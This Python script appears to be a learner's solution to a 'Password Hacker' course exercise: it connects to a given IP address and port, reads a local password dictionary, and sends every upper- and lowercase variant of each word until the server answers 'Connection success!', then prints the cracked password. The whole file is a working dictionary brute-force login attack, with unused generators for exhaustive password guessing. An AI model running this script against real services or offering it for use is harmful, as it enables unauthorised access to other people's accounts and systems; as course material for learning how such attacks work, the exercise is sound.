from itertools import count, combinations_with_replacement, chain, product
import socket
import argparse
import string


def generate_passwords(length):
    alphabet = string.ascii_lowercase + string.digits
    return combinations_with_replacement(alphabet, length)


def generate_all_passwords():
    passwords = chain.from_iterable(generate_passwords(length)
                                    for length in count(1))
    return (''.join(password) for password in passwords)


def pw_case_permutations(password):
    cases = [{char, char.upper()} for char in password]
    permutations = product(*cases)
    return (''.join(permutation) for permutation in permutations)


def try_password(password, client):
    for permutation in pw_case_permutations(password):
        client.send(permutation.encode())
        response = client.recv(32).decode()
        if response == 'Connection success!':
            return True, permutation
    return False, None


def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('IP_address')
    arg_parser.add_argument('port', type=int)
    cli_args = arg_parser.parse_args()
    path = 'C:/Users/Julian/PycharmProjects/Password Hacker/Password ' \
           'Hacker/task/hacking/passwords.txt'
    with socket.socket() as client, open(path) as pw_file:
        client.connect((cli_args.IP_address, cli_args.port))
        for password in map(str.strip, pw_file):
            cracked, pw = try_password(password, client)
            if cracked:
                print(pw)
                break


if __name__ == '__main__':
    main()
